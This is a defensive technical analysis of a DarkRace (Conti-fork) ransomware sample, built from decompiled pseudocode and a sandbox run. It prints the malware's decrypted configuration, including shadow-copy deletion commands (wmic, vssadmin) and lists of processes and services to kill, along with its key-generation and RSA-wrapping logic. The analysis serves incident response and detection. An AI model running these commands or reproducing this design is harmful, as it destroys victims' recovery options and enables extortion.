# DarkRace Ransomware — Detailed Analysis (Static + Any.RUN)

Language: English | French version: [README.md](README.md)

**Sample :** `74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3`  
**Family :** DarkRace (Conti fork) — Any.RUN tag : `ransomware` / YARA **DONEX**  
**Any.RUN :** https://any.run/report/74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3/2eaa5cab-4493-475c-a5f5-7898cd493df6  
**Task ID :** `2eaa5cab-4493-475c-a5f5-7898cd493df6` (Win10 19044 x64, duration 660s, UAC autoconfirm)  
**Sources :** PE + Hex-Rays 9.1 (`*.c`) + Any.RUN sandbox (2026-08-20)

> Defensive / IR analysis only. The binary was not executed outside a third-party sandbox.

---

## 0. Any.RUN ↔ Code Summary

| Any.RUN Observation | Code Confirmation |
|---------------------|-------------------|
| Verdict *Malicious* / Ransomware / YARA **DONEX** | Conti-family (DarkRace branding) |
| PID **7008** : file rename + encryption | `sub_4026C0` / `sub_4039D0` |
| Drop `Readme.3fe57B660.txt` + `*.3fe57B660` | overlay extension + `Readme.%ls.txt` |
| `1.bat` + `taskkill` Office/browsers/DB | `StartAddress` thread + `<kill_keep>` |
| `ping 127.0.0.1` delay | bat `:start` loop + final cleanup |
| Self-delete via `cmd` | `sub_402F40` : `del %s` (malware path) |
| **System reboot** | `shutdown_system=true` → `shutdown -r -f -t 0` |
| Forced reboot then return to login | `shutdown_system=true` (visual proof : screen_15) |
| No malware C2 (network = Windows noise) | offline ransomware ; contact via TOR/Tox/mail in the note |
| Tags : `donex` | Conti-like family alias at Any.RUN |

**Observed files (examples) :**
- `C:\Users\admin\Desktop\currencypost.rtf.3fe57B660`
- `C:\Users\admin\Desktop\Readme.3fe57B660.txt`
- `C:\Users\admin\Documents\Database1.accdb.3fe57B660`

---

## 1. Entry Point — Hide the Console Then Chain Execution

```c
// main @ 0x4035C0
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  HWND WindowA = FindWindowA("ConsoleWindowClass", *argv);
  ShowWindow(WindowA, 0);          // hide the console window
  lpFileName = *argv;              // PE path (for self-delete + overlay key read)
  sub_4030D0(...);                 // init
  sub_403340(...);                 // encryption
  sub_402F40();                    // cleanup + reboot
}
```

**Any.RUN :** manual execution (notepad parent mentioned in INFO) → malware launched → no visible window.

---

## 2. Init `sub_4030D0` — Mutex, Config, VSS, Key, Icon

### 2.1 Single-instance via Mutex — **Why**

```c
// at the very start of sub_4030D0, BEFORE config / VSS / encryption
if (CreateMutexA(0, 1, "CheckMutex") && GetLastError() == 183) // ERROR_ALREADY_EXISTS
{
  ExitProcess(...);   // already an instance → exit immediately
}
```

**What the API Does**

- `CreateMutexA(lpMutexAttributes=NULL, bInitialOwner=TRUE, "CheckMutex")` creates (or opens) a **named object** in the Windows kernel namespace.
- The name `"CheckMutex"` is **global to the session / machine** : all instances of the PE see the same object.
- If the mutex **already existed**, `CreateMutexA` still succeeds (handle opened) **but** `GetLastError()` returns `183` (`ERROR_ALREADY_EXISTS`).
- In that case the code **exits immediately**, without touching files or re-running VSS/threads.

**Why the Ransomware Needs It**

1. **Avoid destructive double encryption**  
   Relaunching the PE while a first instance is running (double-click, operator script, clumsy persistence, replayed GPO / PsExec) would re-run walk + encrypt on files **already** in `.3fe57B660`, with a **new** Salsa20 session key and a **new** RSA footer. Typical Conti/DarkRace outcome : corrupted files / **unrecoverable even after payment**. The mutex protects the “quality” of the attack (and the group reputation mentioned in the note).

2. **Do not multiply side effects**  
   Without a guard : 2× `1.bat` (`taskkill` loops), 2× service stops (`vss`, SQL, Veeam…), 2× `vssadmin` / `wmic`, 2× event log clears, risk of 2× `shutdown -r`. Useless I/O load and system chaos, noisier detection, machine sometimes unusable before the run finishes.

3. **Serialize the encryption run**  
   The model is : **one** instance → generates **one** session key → encrypts with **that** key → coherent unique RSA footer. The mutex guarantees this invariant “1 infection = 1 crypto context”.

4. **IoC / detection (collateral effect for defense)**  
   The fixed name `"CheckMutex"` is trivial to hunt (`CreateMutex` / named handle). This is not stealth : it is **operational reliability** inherited from Conti, prioritized over evasion at this stage.

**Deliberate Order in the Code**

The check is the **first** action of `sub_4030D0`, before XOR of the config, admin check, VSS destruction, key generation, icon, recycle bin. If an instance is already running, the second leaves almost **no** additional trace (no `1.bat` drop, no new encrypted files).

**In Summary** : `CheckMutex` = lock “only one encryption race at a time”, so as not to shoot itself in the foot (double encrypt / double kill / double reboot), not to hide the malware.

### 2.2 Config XML Decryption (XOR 0xA9) — Detailed Process

The config is **not** plaintext in the PE : it is an XML blob encrypted with XOR, stored in `.data`, decrypted **in memory** at runtime, then parsed with **Mini-XML** (`MXML_*`).

#### Step A — Location in the PE

| Element | VA (ImageBase `0x400000`) | Section | File Offset | Role |
|---------|---------------------------|---------|-------------|------|
| Config blob | `0x435000` (`xmmword_435000`) | `.data` | `0x33200` | XOR-encrypted XML, length `0x5A45` (23109 useful bytes once trimmed) |
| XOR key | `0x4295D0` (`xmmword_4295D0`) | `.rdata` | `0x27FD0` | 16 bytes : `A9 A9 A9 … A9` |

The malware does not read an external file : it XORs the **static buffer already mapped** in its image.

#### Step B — Algorithm (Hex-Rays Code)

```c
// sub_4030D0 — right after CheckMutex
for (i = 0; i < 0x5A40; i += 64) {
  // 4 SSE blocks of 16 bytes : blob[i..] ^= key[0..15]
  // key = xmmword_4295D0
}
for (; i < 0x5A45; ++i)          // 5 remaining bytes
  blob[i] ^= 0xA9;               // same byte as the key

// then Mini-XML parse → global tree
dword_43E0EC = sub_410750(..., blob, sub_4120E0);  // mxml_load_string-like
```

**Crypto properties :** single-byte XOR / 16×`0xA9` key → trivial to invert (same operation). Goal = basic anti-strings / anti-YARA, not real confidentiality.

#### Step C — Offline Extraction (Reproducible)

Files produced at the root :

| File | Content |
|------|---------|
| `darkrace_config_decrypted.xml` | **Full** XML (23 109 bytes), including `<ico>` base64 |
| `darkrace_config_readable.xml` | Same XML, `<ico>` truncated for human reading |
| `extract_config.py` | Re-extraction script |

```bash
python3 extract_config.py 74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3 \
  -o darkrace_config_decrypted.xml
```

Core of the algo :

```python
key = pe[key_off:key_off+16]          # 16 × 0xA9
blob = bytearray(pe[blob_off:blob_off+0x5A45])
for i in range(0, 0x5A40, 16):
    for j in range(16):
        blob[i+j] ^= key[j]
for i in range(0x5A40, 0x5A45):
    blob[i] ^= 0xA9
# trim to last '>' → valid UTF-8 XML
```

#### Step D — Runtime Parse (How the Malware Uses It)

After `mxml_load`, lookups are done by **tag name** :

```c
node = sub_4105B0(root, root, "walk_thread", ...);  // finds <walk_thread>
val  = sub_401990(node);                            // node text → "15"
```

Tags present in **this** sample :

`white_extens`, `white_files`, `white_folders`, `kill_keep`, `services`, `black_db`, `encryption_thread`, `walk_thread`, `local_disks`, `network_shares`, `kill_processes`, `kill_services`, `shutdown_system`, `delete_eventlogs`, `cmd` (×2), `content`, `ico`.

#### Step E — Extracted Config (Full, Excluding Icon)

```xml
<?xml version='1.0' encoding='UTF-8'?>
<root>
  <white_extens>386;adv;ani;bat;bin;cab;cmd;com;cpl;cur;deskthemepack;diagcab;diagcfg;diagpkg;dll;drv;exe;hlp;icl;icns;ico;ics;idx;lnk;mod;mpa;msc;msp;msstyles;msu;nls;nomedia;ocx;prf;ps1;rom;rtp;scr;shs;spl;sys;theme;themepack;wpx;lock;key;hta;msi;pdb;search-ms</white_extens>
  <white_files>bootmgr;autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat</white_files>
  <white_folders>$recycle.bin;config.msi;$windows.~bt;$windows.~ws;windows;boot;program files;program files (x86);programdata;system volume information;tor browser;windows.old;intel;msocache;perflogs;x64dbg;public;all users;default;microsoft;appdata</white_folders>
  <kill_keep>sql;oracle;mysq;chrome;veeam;firefox;excel;msaccess;onenote;outlook;powerpnt;winword;wuauclt</kill_keep>
  <services>vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr</services>
  <black_db>ldf;mdf</black_db>
  <encryption_thread>30</encryption_thread>
  <walk_thread>15</walk_thread>
  <local_disks>true</local_disks>
  <network_shares>false</network_shares>
  <kill_processes>true</kill_processes>
  <kill_services>true</kill_services>
  <shutdown_system>true</shutdown_system>
  <delete_eventlogs>true</delete_eventlogs>
  <cmd>wmic shadowcopy delete /nointeractive</cmd>
  <cmd>vssadmin Delete Shadows /All /Quiet</cmd>
  <content>
            ~~~ DarkRace ransomware ~~~
    ... (Tor / Tox / darkrace@onionmail.org note) ...
  </content>
  <ico>... ~20 KB base64 → C:\ProgramData\icon.ico ...</ico>
</root>
```

#### Step F — What Each Field Is For (Behavior Mapping)

| Tag | Value (this sample) | Effect |
|-----|---------------------|--------|
| `white_*` | `;`-separated lists | walk exclusions (do not encrypt) |
| `kill_keep` | sql;oracle;… | content of `1.bat` / `taskkill` |
| `services` | vss;sql;veeam;… | SCM stop patterns |
| `black_db` | ldf;mdf | prioritization / SQL paths |
| `walk_thread` / `encryption_thread` | 15 / 30 | parallelism |
| `local_disks` / `network_shares` | true / **false** | walk scope |
| `kill_processes` / `kill_services` | true / true | enable killer + stop services |
| `shutdown_system` | **true** | `shutdown -r` at end |
| `delete_eventlogs` | true | clear Application/System/Security |
| `cmd` | wmic + vssadmin | pre-encryption (if admin) |
| `content` | DarkRace note | `Readme.<ext>.txt` |
| `ico` | base64 | `icon.ico` + HKCR assoc. |

**Why XOR + Embedded XML :** a single binary “built” per campaign ; the operator changes threads, shares, note, icon without recompiling Conti logic. XOR prevents `strings` from showing the note / VSS commands in cleartext.

### 2.3 Execution of `<cmd>` — Condition, Exact Commands, Effects

This block runs in `sub_4030D0` **after** XML decryption, **before** key generation / walk / encryption. Sole goal of this sample : **destroy Volume Shadow Copies (VSS)** to prevent local restore without paying.

#### 2.3.1 Precondition : Administrator Rights (`sub_402DD0(1)`)

```c
v2 = sub_402DD0(1);   // 1 = require Administrators SID *and* enabled flag
...
if (v2) {
  // loop over all <cmd> nodes in the config
}
```

What `sub_402DD0` does precisely :

1. Opens the thread token, otherwise the process token (`OpenThreadToken` / `OpenProcessToken`).
2. Reads `TokenGroups`.
3. Builds the **BUILTIN\Administrators** SID :
   - `AllocateAndInitializeSid(SECURITY_NT_AUTHORITY, 2, 0x20, 0x220, …)`
   - i.e. `S-1-5-32-544`.
4. Looks for this SID in the token groups.
5. Because the argument is `1`, also returns the **`SE_GROUP_ENABLED`** bit (`(Attributes >> 2) & 1`) : the account must be admin **and** the privilege actually active (not merely “admin denied by UAC” / group present but disabled).

| `sub_402DD0(1)` Result | Consequence |
|------------------------|-------------|
| `0` (not admin / UAC filtered) | **None** of the `<cmd>` are launched. The rest of the ransomware continues (encryption, note, etc.). |
| `1` (elevated admin) | Execution of **each** `<cmd>` from the config. |

On Any.RUN (UAC autoconfirm, user `admin`) → the commands do run.

#### 2.3.2 WOW64 Bypass (32-bit Process on 64-bit OS)

The PE is **PE32**. Before the `WinExec` calls :

```c
Wow64DisableWow64FsRedirection(&OldValue);   // if IsWow64Process == TRUE
// ... WinExec of cmds ...
Wow64RevertWow64FsRedirection(OldValue);
```

Without this, `cmd.exe` / system tools could resolve to `SysWOW64` instead of `System32`. The malware forces the **native 64-bit** view while calling `wmic` / `vssadmin`.

#### 2.3.3 Execution Loop — Commands **Exactly** Launched

```c
for (node = first_xml("cmd"); node; node = next_xml("cmd")) {
  strcpy(buf, "cmd /c \"");
  strcat(buf, node_text);   // raw <cmd> content
  strcat(buf, "\"");        // close the quote
  WinExec(buf, SW_HIDE);    // uCmdShow = 0
}
```

In **this** sample, the config contains **two** `<cmd>` tags → **two** separate `cmd.exe` processes :

| # | Config Line | Line Actually Executed via `WinExec` |
|---|-------------|--------------------------------------|
| 1 | `wmic shadowcopy delete /nointeractive` | `cmd /c "wmic shadowcopy delete /nointeractive"` |
| 2 | `vssadmin Delete Shadows /All /Quiet` | `cmd /c "vssadmin Delete Shadows /All /Quiet"` |

Order = XML order (WMIC first, then VSSADMIN). No explicit wait between the two (`WinExec` does not block on process end) : both start almost in parallel / in quick succession, always **before** `CryptGenRandom` / encrypt.

#### 2.3.4 Command 1 — `wmic shadowcopy delete /nointeractive`

**Tool :** `wmic.exe` (Windows Management Instrumentation Command-line).  
**WMI Class :** `Win32_ShadowCopy`.  
**Action :** `delete` on **all** visible shadow copy instances.  
**`/nointeractive` :** no confirmation prompt.

**What This Concretely Causes :**

- Deletion of **volume snapshots** (VSS snapshots) listed by WMI.
- User / admin impact :
  - **Previous Versions** tab on files/folders → empty or error ;
  - restores based on those snapshots → impossible ;
  - some backup software / agents that rely on these WMI shadow copies → one-off failure.
- Typical events : WMI activity + disappearance of `Shadow Copy ID`s ; sometimes System logs around the VSS service.
- **Encrypts nothing** and **does not touch** user files : it only removes the local safety net.

Limit : depending on OS / policy, WMIC may be deprecated or restricted ; hence the 2nd command as a backup.

#### 2.3.5 Command 2 — `vssadmin Delete Shadows /All /Quiet`

**Tool :** `vssadmin.exe` (Volume Shadow Copy Administrative interface).  
**`Delete Shadows` :** requests deletion of shadow copies.  
**`/All` :** **all** volumes, **all** shadows (not only the system volume).  
**`/Quiet` :** no confirmation, silent output.

**What This Concretely Causes :**

- Direct call to the **VSS** stack (more “official” / lower-level than the WMI path for many environments).
- Erases remaining snapshots (including those WMIC may have missed, or vice versa).
- Classic ransomware IR consequences :
  - no more **System Restore** based on those points if associated shadows are destroyed ;
  - no more file rollback via Previous Versions ;
  - “local VSS-style” backups (some tools, light hypervisors, shadow-aware copies) crippled.
- On a server with many shadows : I/O spike / **VSS** service activity during deletion.

#### 2.3.6 Why **Two** Commands That Do “the Same Thing”?

| Aspect | WMIC | VSSADMIN |
|--------|------|----------|
| API / path | WMI `Win32_ShadowCopy` | Native VSS CLI |
| Coverage | Often all WMI-exposed shadows | `/All` = all volumes via VSS |
| Robustness | May fail if WMI broken / disabled | May fail if `vssadmin` blocked by policy |
| Conti heritage | Classic double-tap anti-recovery pattern | Same |

This is **offensive defense-in-depth** : maximize the chance that **at least one** of the two succeeds in emptying the snapshots. Same ATT&CK logic **T1490 — Inhibit System Recovery**.

#### 2.3.7 Global Effect on the Attack Chain

```
[admin?] ──no──► skip cmd ──► encryption anyway
    │
   yes
    ▼
cmd #1  wmic shadowcopy delete /nointeractive
    ▼
cmd #2  vssadmin Delete Shadows /All /Quiet
    ▼
(later) Salsa20 encryption + note + possible reboot
```

**What the Victim Loses at This Stage (Before Even Encrypt) :**

1. Ability to restore earlier file versions via VSS.
2. A large part of “free” post-ransomware recovery strategies (restore previous version, some `vssadmin list shadows` + copy scripts).
3. System time / noise (WMI + VSS) — useful IoC for SOC, but **too late** for the data if encrypt follows.

**What It Does Not Cause :**

- No deletion of **external** backups (offline NAS, tapes, non-Windows-VSS cloud / SAN snapshots, off-machine replicas).
- No effect if the process is not elevated admin (`<cmd>` are skipped).
- No hardcoding of `<cmd>` : they are 100% driven by the XML config ; another DarkRace/Conti build could put `bcdedit`, `wbadmin`, etc. first. **Here** = only the 2 VSS lines.

#### 2.3.8 “What It Causes” Summary

| Executed Command | Technical Effect | Effect for Victim / IR |
|------------------|------------------|------------------------|
| `cmd /c "wmic shadowcopy delete /nointeractive"` | WMI delete of all `Win32_ShadowCopy` | Previous Versions / local restore via those snapshots → KO |
| `cmd /c "vssadmin Delete Shadows /All /Quiet"` | Silent VSS `/All` delete | Anti-recovery net reinforced on all volumes |
| Both chained as admin | Double snapshot destruction | Strongly reduces recovery chances **without** external backup or RSA key |

### 2.4 Session Key Generation + RSA Footer + Extension — Detailed Process

Still in `sub_4030D0`, **after** the VSS `<cmd>`. This is when the malware fixes the **crypto context for the whole machine** for this run.

```c
Block    = sub_4014D0(..., 16);       // ① Salsa20 session key (16 bytes)
lpBuffer = sub_401A30(Block, 0x10);   // ② RSA(pubkey, Block) → 512 B footer + set extension
sub_4033F0();                         // ③ icon / assoc (see §3)
SHEmptyRecycleBinA(0, 0, 7);          // ④ empty the recycle bin
```

Two critical globals then used by **all** encryption threads :

| Variable | Content | Later Usage |
|----------|---------|-------------|
| `Block` | 16-byte session key (printable ASCII) | input to `sub_4045F0` / Salsa20 for XOR of file chunks |
| `lpBuffer` | **512-byte** blob = RSA-encrypted session key | written at the **end of each** encrypted file (`WriteFile(..., 0x200)`) |
| `lpWideCharStr` | Unicode extension, e.g. `3fe57B660` | rename `file.<ext>` + `Readme.<ext>.txt` |

Without the attacker’s RSA private key, `Block` is no longer recoverable from the footer → files unreadable.

---

#### 2.4.1 — `sub_4014D0` : Drawing the Session Key

```c
CryptAcquireContextA(..., PROV_RSA_FULL=1, ...);  // else CRYPT_NEWKEYSET (8)
CryptGenRandom(hProv, 16, buf);                   // 16 bytes Windows CSPRNG
// then byte-by-byte normalization :
buf[i] = (buf[i] % 0x5E) + 32;   // → ASCII character in [0x20 .. 0x7D]
```

**Normalization Detail**

- `0x5E` = 94. Conti printable ASCII range : space (`0x20`) through `}` (`0x7D`).
- SSE path (if CPU OK) : same formula vectorized (`% 94 + 32`), not another algo.
- Result : a key of **16 displayable characters**, not 16 raw binary bytes.

**Why Do This (Conti Heritage)?**

1. The Salsa20 key remains 128 bits of entropy *after* modulo-94 reduction… in practice entropy is a bit less than pure 128 bits (`log2(94^16) ≈ 104.8 bits`), still beyond realistic brute-force.
2. Historically Conti sometimes handled the key as a **string** (debug, structures, LibTomCrypt imports on text buffers).
3. Each **run** (each successful execution after mutex) draws a **new** key → different machines / runs ≠ same key.

**Possible Failure :** if `CryptAcquireContext` / `CryptGenRandom` fails, the return path is degraded (Hex-Rays shows an ambiguous `return result`) — in practice on normal Windows the happy path is taken.

Diagram :

```
CryptGenRandom(16) ──► raw bytes ──► (x % 94) + 32 ──► Block = "key" 16 chars
```

---

#### 2.4.2 — `sub_401A30(Block, 16)` : Encapsulate the Key + Fix the Extension

Hybrid core **Salsa20 (file) + RSA (key)** :

```
                    ┌─ PE overlay (pubkey + ext) ─┐
Block (16) ──RSA──► │  n (hex), e="010001", ext   │ ──► lpBuffer (512 B)
                    └─────────────────────────────┘
                                      │
                                      └─► lpWideCharStr = L"3fe57B660"
```

**Precise Internal Steps**

1. **Init LibTomCrypt**  
   - `sub_4089C0(..., "rsa_encrypt", 11)` : registers / selects the RSA encrypt primitive.  
   - `mp_int` / key structures (`sub_406AD0`, `sub_407C60`, `sub_408770`, `sub_408430`).

2. **Read PE Overlay** via `sub_402500` (structure detail §2.5)  
   Pointer `v4` on the 527-byte blob pasted after `.reloc` :

   | Overlay Offset | Size | Field | Example this sample |
   |----------------|------|-------|---------------------|
   | 0 | 512 | RSA modulus **as ASCII hex** (256 binary bytes = **RSA-2048**) | `C5A0A7250BB5E100...` |
   | 512 | 6 | Public exponent hex | `010001` (= 65537) |
   | 518 | 9 | File extension | `3fe57B660` |

3. **Copy Fields**
   ```c
   qmemcpy(modulus_hex, v4, 0x200);     // 512 hex chars → n
   memcpy(e_hex, v4+512, 6);            // "010001"
   memcpy(ext_ascii, v4+518, 9);        // "3fe57B660"
   MultiByteToWideChar(..., &lpWideCharStr);
   ```
   If `n` or `e` empty → `ExitProcess` (missing keys = broken build).

4. **Import Public Key**
   ```c
   sub_406E20(N, 16, modulus_hex);   // hex string → big integer N
   sub_406E20(E, 16, e_hex);          // hex → E
   sub_407BB0(rsa_key, N, ..., E);    // builds public rsa_key
   ```

5. **RSA Encryption of the Session Key**
   ```c
   footer = malloc(0x200);  memset 0;
   sub_407C90(rsa_key, ..., Size=16, Src=Block, out=footer);
   return footer;   // → global lpBuffer
   ```
   - Input : the **16 bytes** of `Block`.  
   - Output : **512-byte** buffer (`0x200`).  
   - For RSA-2048, native ciphertext is **256 bytes** ; the 512 buffer is a Conti format (zero padding / historical RSA-4096 fixed size). Each encrypted file still receives **exactly 512 bytes** at EOF.

**Crypto Invariant of the Run**

- 1 mutex OK → 1 `Block` → 1 `lpBuffer` → **all** files on the machine share the **same** session key and the **same** RSA footer.
- The attacker, with the RSA private key, decrypts any footer → recovers `Block` → Salsa20 decrypts the files.
- Without private key : footer unusable (RSA-2048).

---

#### 2.4.3 — What This Concretely Causes

| Product | Where | Effect |
|---------|-------|--------|
| `Block` (Salsa20 key) | Process RAM | Used to XOR all chunks ; **never** written plaintext to disk |
| `lpBuffer` (512 B) | RAM, then EOF of each file | Only “official” way to recover the key after the fact |
| `lpWideCharStr` = `3fe57B660` | global | Rename `doc.pdf` → `doc.pdf.3fe57B660` ; note `Readme.3fe57B660.txt` |
| Overlay / RSA failure | ExitProcess | No half-encryption without pubkey |

**File Chain (Later, §8)**

```
[ chunks XOR-Salsa20(Block) ........ ][ lpBuffer : 512 bytes RSA(Block) ]
                                       ▲
                                  final_file_size = old + 0x200
```

**Any.RUN :** all drops end in `.3fe57B660` → confirms the extension read from the overlay was fixed here, once, before the walk.

---

#### 2.4.4 — Immediate Continuation in the Same Init (Outside Pure Crypto)

After the key :

1. **`sub_4033F0`** — decodes `<ico>`, writes `C:\ProgramData\icon.ico`, creates HKCR `.<ext>` assoc (detail §3).  
2. **`SHEmptyRecycleBinA(0,0,7)`** — empties the recycle bin (flags : no UI / no confirmation / no sound). Files already in `$Recycle.Bin` no longer serve as easy recovery ; recycle folders also remain in `white_folders` for the walk.

These two actions are not part of the crypto scheme, but close the **init** phase before `sub_403340` (walk/encrypt).

---

#### 2.4.5 — Summary

```
VSS destroyed (if admin)
        │
        ▼
CryptGenRandom(16) → normalize ASCII → Block          ① session key
        │
        ▼
Read PE overlay (n, e, ext) → RSA_encrypt(Block)       ② footer + extension
        │
        ├─► lpBuffer (512 B)  ──► will be appended to each file
        ├─► lpWideCharStr     ──► .3fe57B660
        ▼
icon.ico + HKCR + EmptyRecycleBin                     ③ cosmetic / light anti-recovery
        │
        ▼
sub_403340 → walk/encrypt threads (use Block + lpBuffer)
```

### 2.5 Reading the Public Key from the PE **Overlay** — Detailed Process

The RSA **public** key (and the extension) are **not** in the XML config. They are **pasted at the end of the PE** (overlay), classic Conti format. `sub_401A30` retrieves them via `sub_402500` to encapsulate `Block`.

Files extracted at the root :

| File | Content |
|------|---------|
| `overlay_rsa_pubkey.bin` | Raw overlay **527 bytes** |
| `overlay_rsa_n.hex` | RSA modulus (512 hex chars) |
| `overlay_extension.txt` | `3fe57B660` |
| **`rsa_public_key.pem`** | **SPKI / X.509** pubkey (PEM) — standard form |
| `rsa_public_key_pkcs1.pem` | **PKCS#1** pubkey (PEM) |
| `rsa_public_key.der` | Same key in DER |
| `rsa_public_key.txt` | Full sheet (n, e, PEM, extension) |

#### Public Key Documented (This Sample)

| Field | Value |
|-------|-------|
| Algo | **RSA-2048** |
| Exponent **e** | **65537** (`0x10001`, overlay ASCII `010001`) |
| Linked extension | **`.3fe57B660`** |
| Overlay format | `n` hex (512 chars) \|\| `e` \|\| `ext` (9 chars) |
| Usage | `RSA_encrypt(session_key)` → 512 B footer at EOF of each file |

**PEM (SubjectPublicKeyInfo)** — file `rsa_public_key.pem` :

```pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxaCnJQu14QDVsBtCE4BH
BWaOeDzCOEp5HHdZaTPEoY0smRT0LOn4WMFnWNSdEkjlENxVXmh05ecCKV2uMedF
EGDyY7w7hUQ3ij25fXs/rgQeNYpcQwc0e9kwnAZZupEm/ebh3tVyZNp7E0s50yJr
0dcP1mtUhaUJs00vRvSMCmIEYZhYvGluR/4bIe38RpPr7cFi4FmVRkfMI8AJ4ZDf
xTuD4JcHzt9T8/iMy2KhQy0meR/yqUYNDKe5GZ+qL8nj6tsrRHvc4+2Qqk1+tq6u
FGp/YhWs8CEhg3rpGUivfYmN/BMPiGHhSHiZFWnTIhZBDDqz651+YoGLo60nSfpQ
eQIDAQAB
-----END PUBLIC KEY-----
```

**Modulus n** (hex, 256 bytes / 512 chars) :

```
C5A0A7250BB5E100D5B01B4213804705668E783CC2384A791C77596933C4A18D
2C9914F42CE9F858C16758D49D1248E510DC555E6874E5E702295DAE31E74510
60F263BC3B8544378A3DB97D7B3FAE041E358A5C4307347BD9309C0659BA9126
FDE6E1DED57264DA7B134B39D3226BD1D70FD66B5485A509B34D2F46F48C0A62
04619858BC696E47FE1B21EDFC4693EBEDC162E059954647CC23C009E190DFC5
3B83E09707CEDF53F3F88CCB62A1432D26791FF2A9460D0CA7B9199FAA2FC9E3
EADB2B447BDCE3ED90AA4D7EB6AEAE146A7F6215ACF02121837AE91948AF7D89
8DFC130F8861E14878991569D32216410C3AB3EB9D7E62818BA3AD2749FA5079
```

> The corresponding **private key** is **not** in the sample (only the attacker holds it). This pubkey is only useful to verify / reproduce footer encapsulation ; it does not decrypt victim files.

---

#### 2.5.1 — What Is a PE Overlay?

A PE = headers + sections (`.text` … `.reloc`). Every byte **after** the end of the last section on disk is **overlay** : ignored by the Windows loader, but still present in the file.

On this sample :

| Section | PointerToRawData | SizeOfRawData | End |
|---------|------------------|---------------|-----|
| `.text` | `0x400` | `0x27600` | `0x27A00` |
| `.rdata` | `0x27A00` | `0xB800` | `0x33200` |
| `.data` | `0x33200` | `0x6600` | `0x39800` |
| `.rsrc` | `0x39800` | `0x200` | `0x39A00` |
| `.reloc` | `0x39A00` | `0x1C00` | **`0x3B600`** |

- File size = **243 727** bytes (`0x3B80F`)
- End of `.reloc` = **`0x3B600`** (243 200)
- Overlay = `243727 - 243200` = **527 bytes** exactly

```
[ MZ/PE ][ .text | .rdata | .data | .rsrc | .reloc ][ ##### OVERLAY 527 B ##### ]
                                                    ▲
                                                 offset 0x3B600
```

**Why This Technique (Conti)?**

- One build = recompile / patch only the overlay (`n`, `e`, `ext`) without touching the code.
- `strings` on `.rdata` does not necessarily show the RSA modulus (here it is ASCII hex at end of file).
- The loader does not execute the overlay → no extra suspicious executable section.

---

#### 2.5.2 — `sub_402500` : How the Malware Finds the Overlay

`lpFileName` was set in `main` to `argv[0]` = path of the launched binary.

```c
// 1) Opens ITS own file
h = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ|WRITE, ..., OPEN_EXISTING, ...);

// 2) On failure (e.g. UNC path / share) : try WNetAddConnection2A on parent folder, then retry
//    If still KO → ExitProcess

// 3) Load whole PE into memory
buf = malloc(GetFileSize(h) + 1024);
ReadFile(h, buf, fileSize, ...);
*out_base = buf;   // a1 receives the buffer (freed later by caller)

// 4) Parse PE to point just AFTER the last section
nt = buf + *(DWORD*)(buf + 0x3C);           // e_lfanew
// Conti logic : end_of_last_section =
//   PointerToRawData(.reloc) + SizeOfRawData(.reloc)
return buf + 0x39A00 + 0x1C00;              // → buf + 0x3B600  (== overlay start)
```

**Network fallback :** if the sample is executed from a path like `\\server\share\...` and `CreateFileA` fails, the code cuts at the last `\`, does `WNetAddConnection2A` on the share, then reopens. Goal : be able to read the pubkey even in lateral movement / share deployment.

**If overlay is missing / truncated** (“cleaned” PE) : empty `n` or `e` → `sub_401A30` does `ExitProcess`. No encryption without pubkey.

---

#### 2.5.3 — Layout of the 527 Bytes (This Sample)

| Offset | Size | Type | Value |
|--------|------|------|-------|
| `0x000` | 512 | ASCII hex | Modulus **n** (256 binary bytes after `unhex`) = **RSA-2048** |
| `0x200` | 6 | ASCII hex | Exponent **e** = `010001` = **65537** |
| `0x206` | 9 | ASCII | Extension = `3fe57B660` |
| Total | **527** | | `512 + 6 + 9` |

```
0                512      518           527
|<- n hex ASCII ->|<- e ->|<- ext ---->|
 C5A0A7250B...FA5079 010001  3fe57B660
```

**Modulus (start / end) :**

```
n = C5A0A7250BB5E100D5B01B4213804705668E783CC2384A791C77596933C4A18D
    ...
    BA3AD2749FA5079
```

- `len(unhex(n))` = **256** → RSA-2048 (Conti “classic” was often 4096 ; DarkRace here = 2048).
- `e = 65537` : standard Fermat F4 public exponent.
- Extension **9 alphanumeric characters**, **fixed at build** (not random per machine) → all victims of **this** binary get `.3fe57B660`.

Disk extracts :

```text
# overlay_extension.txt
3fe57B660

# overlay_rsa_n.hex (1 line, 512 chars)
C5A0A7250BB5E100...BA3AD2749FA5079
```

---

#### 2.5.4 — Consumption in `sub_401A30` (Link with §2.4)

```c
v4 = sub_402500(&file_buf);          // pointer to overlay

qmemcpy(n_hex, v4, 0x200);           // 512 chars → modulus
memcpy(e_hex,  v4 + 512, 6);         // "010001"
memcpy(ext,    v4 + 518, 9);         // "3fe57B660"
ext[9] = 0;

MultiByteToWideChar(..., ext, &lpWideCharStr);  // L"3fe57B660"

sub_406E20(&N, 16, n_hex);           // hex → big int
sub_406E20(&E, 16, e_hex);
sub_407BB0(&rsa_key, &N, ..., &E); // LibTomCrypt public key

sub_407C90(&rsa_key, ..., 16, Block, lpBuffer); // RSA(Block) → 512 B footer
```

| Overlay Field | Becomes | Observable Effect |
|---------------|---------|-------------------|
| `n` + `e` | RSA public key | identical footer on all files of the run (once `Block` fixed) |
| `3fe57B660` | `lpWideCharStr` | `*.3fe57B660`, `Readme.3fe57B660.txt`, registry key `HKCR\.3fe57B660` |

**Any.RUN :** confirms unique extension `3fe57B660` on Desktop/Documents.

---

#### 2.5.5 — IR / Defense Implications

1. **Build IoC** : hash of the overlay or of modulus `n` = fingerprint of the **campaign / build**, more stable than the full PE hash if only the stub changes.
2. **No private key** in the overlay (only `n`, `e`). Offline decryption of victims is **impossible** with the sample alone.
3. **Carving** : on a disk dump, look for end of PE + 512 hex chars `[0-9A-F]` + `010001` + 9 extension chars.
